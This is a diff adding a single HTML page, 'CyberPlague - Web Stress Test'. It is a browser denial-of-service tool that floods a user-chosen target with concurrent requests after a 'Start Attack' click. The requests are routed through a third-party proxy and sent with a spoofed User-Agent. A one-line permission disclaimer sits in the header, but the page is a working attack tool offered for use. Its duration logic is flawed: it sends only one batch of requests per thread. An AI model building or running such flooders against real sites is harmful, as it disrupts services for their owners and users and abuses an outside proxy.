@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberPlague - Web Stress Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #212121;
+            color: white;
+            padding: 20px;
+            margin: 0;
+        }
+        header {
+            background-color: #00bcd4;
+            padding: 15px;
+            text-align: center;
+            border-radius: 8px;
+        }
+        .container {
+            background-color: #333;
+            padding: 20px;
+            margin-top: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        input[type="text"],
+        input[type="number"],
+        button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #4a4a4a;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #00bcd4;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0097a7;
+        }
+        .log {
+            background-color: #444;
+            color: #f1f1f1;
+            padding: 15px;
+            margin-top: 20px;
+            height: 300px;
+            overflow-y: auto;
+            font-family: 'Courier New', Courier, monospace;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        .log-message {
+            margin: 5px 0;
+        }
+        .log-success {
+            color: #4CAF50; /* Green */
+        }
+        .log-error {
+            color: #F44336; /* Red */
+        }
+        .log-info {
+            color: #2196F3; /* Blue */
+        }
+        .control-buttons {
+            display: flex;
+            justify-content: space-between;
+        }
+        #stopButton {
+            background-color: #F44336;
+        }
+        #stopButton:hover {
+            background-color: #D32F2F;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>CyberPlague - Web Stress Test</h1>
+    <p>⚠️ Use responsibly and only on systems you own or have explicit permission to test ⚠️</p>
+</header>
+
+<div class="container">
+    <label for="target">Target IP or Website:</label>
+    <input type="text" id="target" placeholder="e.g., example.com" required>
+
+    <label for="duration">Attack Duration (Minutes):</label>
+    <input type="number" id="duration" min="1" required>
+
+    <label for="threads">Number of Threads:</label>
+    <input type="number" id="threads" min="1" required>
+
+    <div class="control-buttons">
+        <button onclick="startAttack()">Start Attack</button>
+        <button id="stopButton" onclick="stopAttack()" disabled>Stop Attack</button>
+    </div>
+</div>
+
+<div class="log" id="log"></div>
+
+<script>
+    let attackRunning = false;
+    let attackTimeout;
+    let threadsInProgress = [];
+    const logElement = document.getElementById('log');
+
+    // Function to log messages
+    function logMessage(message, type) {
+        const messageElement = document.createElement('div');
+        messageElement.classList.add('log-message', type);
+        messageElement.textContent = message;
+        logElement.appendChild(messageElement);
+        logElement.scrollTop = logElement.scrollHeight; // Auto-scroll
+    }
+
+    // Function to send a single HTTP request
+    async function sendRequest(target) {
+        const proxyUrl = 'https://api.allorigins.win/raw?url='; // Updated Proxy
+        const url = proxyUrl + encodeURIComponent(target); // Adding proxy URL to target URL
+
+        try {
+            const response = await fetch(url, {
+                method: 'GET',
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+                }
+            });
+
+            if (response.ok) {
+                logMessage(`Successfully sent request to ${target}`, 'log-success');
+            } else {
+                throw new Error(`Received non-OK response: ${response.status}`);
+            }
+        } catch (error) {
+            logMessage(`Error: ${error.message}`, 'log-error');
+        }
+    }
+
+    // Start attack function
+    function startAttack() {
+        const target = document.getElementById("target").value;
+        const duration = parseInt(document.getElementById("duration").value);
+        const threads = parseInt(document.getElementById("threads").value);
+
+        if (!target || !duration || !threads || isNaN(duration) || isNaN(threads)) {
+            logMessage("❌ Please provide valid inputs for all fields!", 'log-error');
+            return;
+        }
+
+        logMessage(`🚀 Starting stress test on ${target} for ${duration} minutes with ${threads} threads...`, 'log-info');
+        attackRunning = true;
+        document.getElementById("stopButton").disabled = false;
+
+        const endTime = Date.now() + duration * 60 * 1000; // Attack end time
+
+        for (let i = 0; i < threads; i++) {
+            if (attackRunning && Date.now() < endTime) {
+                // Execute fetch requests in parallel (concurrent requests)
+                threadsInProgress.push(
+                    fetchRequestsConcurrently(target)
+                );
+            } else {
+                break;
+            }
+        }
+
+        attackTimeout = setTimeout(() => {
+            stopAttack();
+        }, duration * 60 * 1000); // Stop attack after duration
+    }
+
+    // Execute multiple requests concurrently
+    async function fetchRequestsConcurrently(target) {
+        // Trigger multiple requests as fast as possible
+        const requests = [];
+        for (let i = 0; i < 10; i++) {
+            requests.push(sendRequest(target));
+        }
+        await Promise.all(requests); // Wait for all requests to finish
+    }
+
+    // Stop attack function
+    function stopAttack() {
+        attackRunning = false;
+        clearTimeout(attackTimeout);
+        document.getElementById("stopButton").disabled = true;
+
+        // Clear all ongoing threads
+        threadsInProgress = [];
+
+        logMessage("🛑 Attack stopped.", 'log-error');
+    }
+</script>
+
+</body>
+</html>
